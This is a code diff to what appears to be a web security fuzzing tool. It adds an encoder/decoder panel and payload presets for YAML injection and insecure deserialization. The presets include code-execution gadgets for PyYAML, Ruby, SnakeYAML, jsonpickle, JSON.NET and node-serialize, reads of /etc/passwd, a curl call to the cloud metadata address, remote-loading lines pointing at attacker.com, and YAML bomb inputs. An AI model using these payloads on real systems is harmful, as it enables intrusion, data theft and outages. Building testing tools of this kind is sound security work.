@@ -2114,6 +2114,7 @@ label.btn-sm:hover { border-color: var(--accent); color: var(--accent); }
       oninput="saveOobUrl()" />
   </label>
   <button class="btn-sm" id="fuzzer-toggle-btn" style="display:none;color:#e3b341;border-color:#4a3a10" onclick="toggleFuzzer()" title="Show / hide Fuzzer">&#9889; Fuzzer</button>
+  <button class="btn-sm" onclick="openEncoderModal()" title="Encoder / Decoder" style="color:#c792ea;border-color:#3a1a5c">&#128273; Encoder</button>
   <span id="project-indicator" style="font-size:11px;display:flex;align-items:center;gap:0.4rem;padding:0 0.4rem;border:1px solid var(--border);border-radius:4px;background:var(--surface);height:24px">
     <span style="color:var(--muted)">&#128196;</span>
     <span id="project-name" style="color:var(--accent);font-family:monospace">No project</span>
@@ -3505,6 +3506,93 @@ const PAYLOAD_PRESETS = {
     '${'.repeat(200) + '7*7' + '}'.repeat(200),
   ],
 
+  'YAML injection': [
+    // RCE via PyYAML / ruamel unsafe load (also run Deserialization category for broader gadget coverage)
+    '!!python/object/apply:os.system ["curl http://169.254.169.254/latest/meta-data/"]',
+    '!!python/object/apply:subprocess.check_output [["cat","/etc/passwd"]]',
+    '!!python/object/apply:subprocess.Popen\nargs: [["/bin/sh","-c","id"]]\nstdout: !!python/object/apply:subprocess.PIPE []',
+    '!!python/object/new:type\nargs: ["z", !!python/tuple [], {"extend": !!python/name:exec }]\nlistitems: "import os; os.system(\'id\')"',
+    // RCE via Ruby YAML (Psych)
+    '--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Version\n  version: 7*7',
+    '--- !!map\n  ? !!str ""\n  : !ruby/sym foo',
+    // RCE via Java SnakeYAML
+    '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]',
+    '!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: "ldap://attacker.com:1389/exploit"\n  autoCommit: true',
+    // Billion laughs / YAML bomb (DoS)
+    'a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]',
+    // Type confusion — YAML auto-typing of booleans / null / numbers
+    'true',
+    'false',
+    'null',
+    '~',
+    '!!null ""',
+    '!!bool "true"',
+    '!!int "0"',
+    '!!float "1e999"',
+    '1_000_000',
+    '0x41',
+    '0o777',
+    '1.0e+308',
+    // Norway problem — bare words parsed as booleans in YAML 1.1
+    'yes',
+    'no',
+    'on',
+    'off',
+    'Yes',
+    'No',
+    'ON',
+    'OFF',
+    // Merge key abuse
+    '<<: *anchorThatDoesNotExist',
+    // YAML tag injection in string context
+    '!!str true',
+    '!!str null',
+    '!!python/none',
+    // Newline / multiline smuggling
+    "foo\nbar: injected",
+    "|\n  line1\n  line2",
+    ">\n  folded content with: colon",
+    // Anchor / alias cycle (parser DoS)
+    '&x [*x]',
+    // PyYAML additional RCE gadgets — exec / importlib / open
+    '!!python/object/apply:builtins.exec ["import os; os.system(\'id\')"]',
+    '!!python/object/apply:importlib.import_module ["os"]',
+    '!!python/object/apply:builtins.open ["/etc/passwd"]',
+    '!!python/object/apply:builtins.eval ["__import__(\'os\').system(\'id\')"]',
+    // jsonpickle embedded as a YAML string value — hits servers that YAML-parse then jsonpickle-decode
+    '{"py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["id"]}]}',
+    '{"py/object/apply": "subprocess.check_output", "args": [["id"]]}',
+    // !!binary tag — triggers base64 decode by parser; probe for unexpected decode path
+    "!!binary |\n  aWQ=",
+    "!!binary |\n  L2V0Yy9wYXNzd2Q=",
+    // !!timestamp tag — triggers date/time parsing; type confusion in typed languages
+    '!!timestamp 2025-01-01',
+    '2025-01-01T00:00:00Z',
+    '!!timestamp 2025-01-01 00:00:00.000000 +00:00',
+    // !!omap / !!pairs / !!set — less-tested collection tags
+    "!!omap\n- key: value",
+    "!!set\n  ? admin\n  ? root",
+    "!!pairs\n- [key, value]",
+    // YAML 1.1 sexagesimal (base-60) numbers — parsed as integers by older parsers
+    '60:0',
+    '1:0:0',
+    '2:30:0',
+    '0:0:1',
+    // YAML 1.1 octal — 0755 is octal in YAML 1.1, a string in YAML 1.2
+    '0755',
+    '0777',
+    '010',
+    '0644',
+    // Unicode / encoding tricks
+    "﻿true",
+    "true",
+    // Safe scalar boundary tests
+    '---',
+    '...',
+    '--- ~',
+    '---\nnull\n...',
+  ],
+
   'LDAP injection': [
     // Auth bypass — wildcard
     '*',
@@ -3672,6 +3760,35 @@ const PAYLOAD_PRESETS = {
     '!!python/object/apply:subprocess.check_output [["id"]]',
     '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[]]]',
     '!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://evil.example.com/Exploit", autoCommit: true}',
+    // Python jsonpickle — common in Python APIs that serialize objects to/from JSON
+    '{"py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["id"]}]}',
+    '{"py/reduce": [{"py/type": "subprocess.check_output"}, {"py/tuple": [["id"]]}]}',
+    '{"py/object/apply": "os.system", "args": ["id"]}',
+    '{"py/object/apply": "subprocess.check_output", "args": [["cat", "/etc/passwd"]]}',
+    '{"py/object": "subprocess.Popen", "args": [["id"]], "state": {"_popen": null}}',
+    // Python jsonpickle — base64 encoded (servers that b64-decode then jsonpickle-decode)
+    'eyJweS9yZWR1Y2UiOiBbeyJweS90eXBlIjogIm9zLnN5c3RlbSJ9LCB7InB5L3R1cGxlIjogWyJpZCJdfV19',
+    // .NET JSON.NET TypeNameHandling — triggers on TypeNameHandling.All / Auto
+    '{"$type":"System.IO.FileInfo, mscorlib","fileName":"/etc/passwd"}',
+    '{"$type":"System.IO.StreamReader, mscorlib","path":"/etc/passwd"}',
+    '{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"id","UseShellExecute":false}}',
+    // .NET — ObjectDataProvider gadget (requires WindowsBase, common in desktop MCP clients)
+    '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
+    // Node.js — node-serialize IIFE variants (serialize npm package)
+    '{"rce":"_$$ND_FUNC$$_function (){return require(\'child_process\').execSync(\'id\').toString()}()"}',
+    '{"rce":"_$$ND_FUNC$$_function (){return process.mainModule.require(\'child_process\').execSync(\'id\').toString()}()"}',
+    // Node.js — cryo deserialization (cryo npm package)
+    '{"root":"_CRYO_UNDEFINED_","references":[{"contents":"","path":"root","type":"_CRYO_FUNCTION_"}]}',
+    // Java — Commons Collections CC1 gadget chain probe (base64 ysoserial output)
+    'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==',
+    // Java — Spring gadget chain probe
+    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZA==',
+    // MessagePack magic byte probe (0x80=fixmap empty, 0x81=fixmap 1 key)
+    '\\x80',
+    '\\x81\\xa3rce\\xc3',
+    // CBOR magic byte probe (0xa0=empty map, 0xbf=indefinite map)
+    '\\xa0',
+    '\\xbf\\xff',
   ],
 
   'HTTP header injection': [
@@ -6252,6 +6369,283 @@ function openDiffModal() {
   document.body.appendChild(ov);
   const esc2 = ev => { if (ev.key === 'Escape') { ov.remove(); document.removeEventListener('keydown', esc2); } };
   document.addEventListener('keydown', esc2);
+}
+
+// ── Encoder / Decoder ─────────────────────────────────────────────────────
+
+// MD5 implementation (RFC 1321)
+function _md5(str) {
+  function safeAdd(x, y) { const lsw=(x&0xffff)+(y&0xffff); return (((x>>16)+(y>>16)+(lsw>>16))<<16)|(lsw&0xffff); }
+  function bitRotL(num, cnt) { return (num<<cnt)|(num>>>(32-cnt)); }
+  function md5cmn(q,a,b,x,s,t){return safeAdd(bitRotL(safeAdd(safeAdd(a,q),safeAdd(x,t)),s),b);}
+  function md5ff(a,b,c,d,x,s,t){return md5cmn((b&c)|((~b)&d),a,b,x,s,t);}
+  function md5gg(a,b,c,d,x,s,t){return md5cmn((b&d)|(c&(~d)),a,b,x,s,t);}
+  function md5hh(a,b,c,d,x,s,t){return md5cmn(b^c^d,a,b,x,s,t);}
+  function md5ii(a,b,c,d,x,s,t){return md5cmn(c^(b|(~d)),a,b,x,s,t);}
+  function coreMD5(x,len){
+    x[len>>5]|=0x80<<(len%32); x[(((len+64)>>>9)<<4)+14]=len;
+    let a=1732584193,b=-271733879,c=-1732584194,d=271733878;
+    for(let i=0;i<x.length;i+=16){
+      const oa=a,ob=b,oc=c,od=d;
+      a=md5ff(a,b,c,d,x[i],7,-680876936);d=md5ff(d,a,b,c,x[i+1],12,-389564586);c=md5ff(c,d,a,b,x[i+2],17,606105819);b=md5ff(b,c,d,a,x[i+3],22,-1044525330);
+      a=md5ff(a,b,c,d,x[i+4],7,-176418897);d=md5ff(d,a,b,c,x[i+5],12,1200080426);c=md5ff(c,d,a,b,x[i+6],17,-1473231341);b=md5ff(b,c,d,a,x[i+7],22,-45705983);
+      a=md5ff(a,b,c,d,x[i+8],7,1770035416);d=md5ff(d,a,b,c,x[i+9],12,-1958414417);c=md5ff(c,d,a,b,x[i+10],17,-42063);b=md5ff(b,c,d,a,x[i+11],22,-1990404162);
+      a=md5ff(a,b,c,d,x[i+12],7,1804603682);d=md5ff(d,a,b,c,x[i+13],12,-40341101);c=md5ff(c,d,a,b,x[i+14],17,-1502002290);b=md5ff(b,c,d,a,x[i+15],22,1236535329);
+      a=md5gg(a,b,c,d,x[i+1],5,-165796510);d=md5gg(d,a,b,c,x[i+6],9,-1069501632);c=md5gg(c,d,a,b,x[i+11],14,643717713);b=md5gg(b,c,d,a,x[i],20,-373897302);
+      a=md5gg(a,b,c,d,x[i+5],5,-701558691);d=md5gg(d,a,b,c,x[i+10],9,38016083);c=md5gg(c,d,a,b,x[i+15],14,-660478335);b=md5gg(b,c,d,a,x[i+4],20,-405537848);
+      a=md5gg(a,b,c,d,x[i+9],5,568446438);d=md5gg(d,a,b,c,x[i+14],9,-1019803690);c=md5gg(c,d,a,b,x[i+3],14,-187363961);b=md5gg(b,c,d,a,x[i+8],20,1163531501);
+      a=md5gg(a,b,c,d,x[i+13],5,-1444681467);d=md5gg(d,a,b,c,x[i+2],9,-51403784);c=md5gg(c,d,a,b,x[i+7],14,1735328473);b=md5gg(b,c,d,a,x[i+12],20,-1926607734);
+      a=md5hh(a,b,c,d,x[i+5],4,-378558);d=md5hh(d,a,b,c,x[i+8],11,-2022574463);c=md5hh(c,d,a,b,x[i+11],16,1839030562);b=md5hh(b,c,d,a,x[i+14],23,-35309556);
+      a=md5hh(a,b,c,d,x[i+1],4,-1530992060);d=md5hh(d,a,b,c,x[i+4],11,1272893353);c=md5hh(c,d,a,b,x[i+7],16,-155497632);b=md5hh(b,c,d,a,x[i+10],23,-1094730640);
+      a=md5hh(a,b,c,d,x[i+13],4,681279174);d=md5hh(d,a,b,c,x[i],11,-358537222);c=md5hh(c,d,a,b,x[i+3],16,-722521979);b=md5hh(b,c,d,a,x[i+6],23,76029189);
+      a=md5hh(a,b,c,d,x[i+9],4,-640364487);d=md5hh(d,a,b,c,x[i+12],11,-421815835);c=md5hh(c,d,a,b,x[i+15],16,530742520);b=md5hh(b,c,d,a,x[i+2],23,-995338651);
+      a=md5ii(a,b,c,d,x[i],6,-198630844);d=md5ii(d,a,b,c,x[i+7],10,1126891415);c=md5ii(c,d,a,b,x[i+14],15,-1416354905);b=md5ii(b,c,d,a,x[i+5],21,-57434055);
+      a=md5ii(a,b,c,d,x[i+12],6,1700485571);d=md5ii(d,a,b,c,x[i+3],10,-1894986606);c=md5ii(c,d,a,b,x[i+10],15,-1051523);b=md5ii(b,c,d,a,x[i+1],21,-2054922799);
+      a=md5ii(a,b,c,d,x[i+8],6,1873313359);d=md5ii(d,a,b,c,x[i+15],10,-30611744);c=md5ii(c,d,a,b,x[i+6],15,-1560198380);b=md5ii(b,c,d,a,x[i+13],21,1309151649);
+      a=md5ii(a,b,c,d,x[i+4],6,-145523070);d=md5ii(d,a,b,c,x[i+11],10,-1120210379);c=md5ii(c,d,a,b,x[i+2],15,718787259);b=md5ii(b,c,d,a,x[i+9],21,-343485551);
+      a=safeAdd(a,oa);b=safeAdd(b,ob);c=safeAdd(c,oc);d=safeAdd(d,od);
+    }
+    return [a,b,c,d];
+  }
+  function str2binl(s){const a=[];for(let i=0;i<s.length*8;i+=8)a[i>>5]|=(s.charCodeAt(i/8)&0xff)<<(i%32);return a;}
+  function binl2hex(b){const h='0123456789abcdef';let s='';for(let i=0;i<b.length*4;i++)s+=h[(b[i>>2]>>(i%4*8+4))&0xf]+h[(b[i>>2]>>(i%4*8))&0xf];return s;}
+  const enc = new TextEncoder().encode(str);
+  let latin = '';
+  enc.forEach(b => latin += String.fromCharCode(b));
+  return binl2hex(coreMD5(str2binl(latin), latin.length * 8));
+}
+
+async function _sha(text, algo) {
+  const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(text));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+// Punycode encode (basic Bootstring algorithm for ASCII-compatible encoding)
+function _punycodeEncode(str) {
+  // Only encode if non-ASCII present
+  if (/^[\x00-\x7f]*$/.test(str)) return str;
+  try {
+    // Use URL hostname trick — browsers do punycode via URL
+    const url = new URL('http://' + str);
+    return url.hostname;
+  } catch { return str; }
+}
+
+function _htmlEntitiesEncode(str) {
+  const named = {'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;',"'":'&apos;'};
+  return [...str].map(c => {
+    if (named[c]) return named[c];
+    const n = c.codePointAt(0);
+    return n > 127 ? '&#' + n + ';' : c;
+  }).join('');
+}
+function _htmlEntitiesDecodeAll(str) {
+  const ta = document.createElement('textarea');
+  ta.innerHTML = str;
+  return ta.value;
+}
+
+function _ldapEscape(str) {
+  return str.replace(/[\\,=+<>#;'"]/g, c => '\\' + c.charCodeAt(0).toString(16).padStart(2,'0').toUpperCase())
+            .replace(/[\x00-\x1f\x7f-\xff]/g, c => '\\' + c.charCodeAt(0).toString(16).padStart(2,'0').toUpperCase());
+}
+
+function _psBase64Encode(str) {
+  // PowerShell Base64 = UTF-16LE bytes → Base64
+  const bytes = [];
+  for (let i = 0; i < str.length; i++) {
+    const c = str.charCodeAt(i);
+    bytes.push(c & 0xff, (c >> 8) & 0xff);
+  }
+  let bin = '';
+  bytes.forEach(b => bin += String.fromCharCode(b));
+  return btoa(bin);
+}
+
+function _psBase64Decode(str) {
+  try {
+    const bin = atob(str.trim());
+    let out = '';
+    for (let i = 0; i + 1 < bin.length; i += 2)
+      out += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i+1) << 8));
+    return out;
+  } catch(e) { return 'Error: ' + e.message; }
+}
+
+function _hexDecode(str) {
+  // Strip common prefixes and separators, then decode
+  const clean = str.replace(/\\x|0x|%/gi, '').replace(/[\s,]/g, '');
+  if (!/^[0-9a-f]*$/i.test(clean) || clean.length % 2) return 'Error: invalid hex';
+  let out = '';
+  for (let i = 0; i < clean.length; i += 2)
+    out += String.fromCharCode(parseInt(clean.slice(i, i+2), 16));
+  try { return decodeURIComponent(escape(out)); } catch { return out; }
+}
+
+function _xmlPretty(str) {
+  try {
+    const doc = new DOMParser().parseFromString(str, 'application/xml');
+    if (doc.querySelector('parsererror')) return 'XML parse error:\n' + doc.querySelector('parsererror').textContent;
+    const xs = new XMLSerializer();
+    let out = xs.serializeToString(doc);
+    // Basic indent
+    let indent = 0;
+    return out.replace(/></g, '>\n<').split('\n').map(line => {
+      if (line.match(/^<\/\w/)) indent -= 2;
+      const padded = ' '.repeat(Math.max(0, indent)) + line;
+      if (line.match(/^<\w[^\/]*[^\/]>$/) && !line.match(/<.*>.*<\/.*>/)) indent += 2;
+      return padded;
+    }).join('\n');
+  } catch(e) { return 'Error: ' + e.message; }
+}
+
+async function _applyEncoderOp(op) {
+  const inp = document.getElementById('enc-input');
+  const out = document.getElementById('enc-output');
+  const src = inp.value;
+  let result = '';
+  try {
+    switch(op) {
+      // ── Encode ──────────────────────────────────────────────────────────
+      case 'b64-enc':        result = btoa(unescape(encodeURIComponent(src))); break;
+      case 'b64url-enc':     result = btoa(unescape(encodeURIComponent(src))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); break;
+      case 'url-enc':        result = encodeURIComponent(src); break;
+      case 'url-full-enc':   result = [...new TextEncoder().encode(src)].map(b=>'%'+b.toString(16).toUpperCase().padStart(2,'0')).join(''); break;
+      case 'url-double-enc': result = encodeURIComponent(encodeURIComponent(src)); break;
+      case 'html-enc':       result = _htmlEntitiesEncode(src); break;
+      case 'html-hex-enc':   result = [...src].map(c=>`&#x${c.codePointAt(0).toString(16).toUpperCase()};`).join(''); break;
+      case 'hex-slash-enc':  result = [...new TextEncoder().encode(src)].map(b=>'\\x'+b.toString(16).padStart(2,'0')).join(''); break;
+      case 'hex-0x-enc':     result = [...new TextEncoder().encode(src)].map(b=>'0x'+b.toString(16).padStart(2,'0')).join(' '); break;
+      case 'hex-plain-enc':  result = [...new TextEncoder().encode(src)].map(b=>b.toString(16).padStart(2,'0')).join(''); break;
+      case 'uni-enc':        result = [...src].map(c=>`\\u${c.codePointAt(0).toString(16).padStart(4,'0')}`).join(''); break;
+      case 'uni-html-enc':   result = [...src].map(c=>`&#x${c.codePointAt(0).toString(16).toUpperCase()};`).join(''); break;
+      case 'puny-enc':       result = _punycodeEncode(src); break;
+      case 'ps-b64-enc':     result = _psBase64Encode(src); break;
+      case 'ldap-enc':       result = _ldapEscape(src); break;
+      // ── Decode ──────────────────────────────────────────────────────────
+      case 'b64-dec':        result = decodeURIComponent(escape(atob(src.trim()))); break;
+      case 'b64url-dec': {
+        let s=src.trim().replace(/-/g,'+').replace(/_/g,'/');
+        while(s.length%4)s+='=';
+        result = decodeURIComponent(escape(atob(s))); break;
+      }
+      case 'url-dec':        result = decodeURIComponent(src.replace(/\+/g,' ')); break;
+      case 'url-double-dec': result = decodeURIComponent(decodeURIComponent(src.replace(/\+/g,' '))); break;
+      case 'html-dec':       result = _htmlEntitiesDecodeAll(src); break;
+      case 'hex-dec':        result = _hexDecode(src); break;
+      case 'uni-dec':        result = src.replace(/\\u([0-9a-f]{4})/gi,(_,h)=>String.fromCodePoint(parseInt(h,16)))
+                                        .replace(/&#x([0-9a-f]+);/gi,(_,h)=>String.fromCodePoint(parseInt(h,16)))
+                                        .replace(/&#(\d+);/g,(_,n)=>String.fromCodePoint(parseInt(n,10))); break;
+      case 'ps-b64-dec':     result = _psBase64Decode(src); break;
+      // ── Hash ────────────────────────────────────────────────────────────
+      case 'md5':            result = _md5(src); break;
+      case 'sha1':           result = await _sha(src, 'SHA-1'); break;
+      case 'sha256':         result = await _sha(src, 'SHA-256'); break;
+      case 'sha512':         result = await _sha(src, 'SHA-512'); break;
+      // ── Special ─────────────────────────────────────────────────────────
+      case 'jwt-dec': {
+        const parts = src.trim().split('.');
+        if (parts.length < 2) { result = 'Not a JWT (need header.payload[.signature])'; break; }
+        const decPart = p => { let s=p.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4)s+='='; try{return JSON.parse(atob(s));}catch{return atob(s);} };
+        result = 'Header:\n' + JSON.stringify(decPart(parts[0]),null,2)
+               + '\n\nPayload:\n' + JSON.stringify(decPart(parts[1]),null,2)
+               + (parts[2] ? '\n\nSignature (raw):\n' + parts[2] : '\n\n(no signature)');
+        break;
+      }
+      case 'saml-dec': {
+        let xml = src.trim();
+        try { xml = decodeURIComponent(escape(atob(xml.replace(/-/g,'+').replace(/_/g,'/')))); } catch {}
+        try { xml = decodeURIComponent(xml); } catch {}
+        result = _xmlPretty(xml); break;
+      }
+      case 'json-fmt':  try{result=JSON.stringify(JSON.parse(src),null,2);}catch(e){result='JSON error: '+e.message;} break;
+      case 'json-min':  try{result=JSON.stringify(JSON.parse(src));}catch(e){result='JSON error: '+e.message;} break;
+      default: result = 'Unknown operation: ' + op;
+    }
+  } catch(e) { result = 'Error: ' + e.message; }
+  out.value = result;
+}
+
+function openEncoderModal() {
+  document.getElementById('enc-overlay')?.remove();
+  const ov = document.createElement('div');
+  ov.id = 'enc-overlay';
+  ov.style.cssText = 'position:fixed;inset:0;z-index:2000;display:flex;flex-direction:column;background:var(--bg)';
+  const btnStyle = 'font-size:10px;padding:.15rem .4rem;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:3px;cursor:pointer;white-space:nowrap';
+  const btn = (label, op, title='') =>
+    `<button style="${btnStyle}" title="${esc(title)}" onclick="_applyEncoderOp('${op}')">${esc(label)}</button>`;
+  const row = (label, btns) =>
+    `<div style="display:flex;align-items:center;gap:.3rem;flex-wrap:wrap;padding:.2rem 0">
+       <span style="font-size:10px;color:var(--muted);width:52px;text-align:right;flex-shrink:0">${esc(label)}</span>
+       ${btns}
+     </div>`;
+  ov.innerHTML = `
+    <div class="panel-modal-hdr">
+      <span style="color:#c792ea;font-weight:700;font-family:monospace;font-size:13px">&#128273; Encoder / Decoder</span>
+      <button class="btn-sm" onclick="document.getElementById('enc-overlay').remove()">&#x2715; Close</button>
+    </div>
+    <div style="display:flex;flex-direction:column;flex:1;padding:.6rem;gap:.4rem;overflow:hidden">
+      <div style="display:flex;gap:.4rem;flex:1;min-height:0">
+        <div style="display:flex;flex-direction:column;flex:1;gap:.3rem">
+          <div style="font-size:10px;color:var(--muted)">Input</div>
+          <textarea id="enc-input" spellcheck="false"
+            style="flex:1;font-family:monospace;font-size:12px;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:.4rem;resize:none"></textarea>
+        </div>
+        <div style="display:flex;flex-direction:column;flex:1;gap:.3rem">
+          <div style="display:flex;align-items:center;gap:.4rem">
+            <span style="font-size:10px;color:var(--muted)">Output</span>
+            <button style="${btnStyle}" onclick="document.getElementById('enc-input').value=document.getElementById('enc-output').value" title="Move output to input">&#8593; Use as input</button>
+            <button style="${btnStyle}" onclick="navigator.clipboard.writeText(document.getElementById('enc-output').value)" title="Copy output">&#128203; Copy</button>
+          </div>
+          <textarea id="enc-output" spellcheck="false" readonly
+            style="flex:1;font-family:monospace;font-size:12px;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:.4rem;resize:none;color:var(--accent)"></textarea>
+        </div>
+      </div>
+      <div style="border:1px solid var(--border);border-radius:4px;padding:.4rem .6rem;background:var(--surface)">
+        ${row('Encode →',
+          btn('Base64','b64-enc') +
+          btn('Base64URL','b64url-enc','RFC 4648 URL-safe (no padding)') +
+          btn('URL (min)','url-enc','encodeURIComponent — encodes special chars') +
+          btn('URL (full)','url-full-enc','Encodes every byte including letters') +
+          btn('Double URL','url-double-enc','%xx → %25xx') +
+          btn('HTML named','html-enc','&amp; &lt; &gt; etc.') +
+          btn('HTML hex','html-hex-enc','&#xNN; for every char') +
+          btn('Hex \\x','hex-slash-enc','\\x41\\x42…') +
+          btn('Hex 0x','hex-0x-enc','0x41 0x42…') +
+          btn('Hex plain','hex-plain-enc','4142…') +
+          btn('Unicode \\u','uni-enc','\\u0041…') +
+          btn('Punycode','puny-enc','xn-- IDN encoding') +
+          btn('PS Base64','ps-b64-enc','PowerShell UTF-16LE Base64') +
+          btn('LDAP','ldap-enc','Escape LDAP special chars')
+        )}
+        ${row('Decode ←',
+          btn('Base64','b64-dec') +
+          btn('Base64URL','b64url-dec') +
+          btn('URL','url-dec','decodeURIComponent') +
+          btn('Double URL','url-double-dec') +
+          btn('HTML','html-dec','Decode &amp; &#NN; &#xNN;') +
+          btn('Hex','hex-dec','Auto-detect \\xNN 0xNN %NN or plain') +
+          btn('Unicode','uni-dec','\\uNNNN &#xNN; &#NN;') +
+          btn('PS Base64','ps-b64-dec','PowerShell UTF-16LE Base64')
+        )}
+        ${row('Hash',
+          btn('MD5','md5') +
+          btn('SHA-1','sha1') +
+          btn('SHA-256','sha256') +
+          btn('SHA-512','sha512')
+        )}
+        ${row('Special',
+          btn('JWT decode','jwt-dec','Split and pretty-print header + payload') +
+          btn('SAML decode','saml-dec','Base64 decode + pretty-print XML') +
+          btn('JSON format','json-fmt') +
+          btn('JSON minify','json-min')
+        )}
+      </div>
+    </div>`;
+  document.body.appendChild(ov);
+  document.getElementById('enc-input').focus();
+  const kh = e => { if (e.key === 'Escape') { ov.remove(); document.removeEventListener('keydown', kh); } };
+  document.addEventListener('keydown', kh);
 }
 
 function openHistoryModal() {
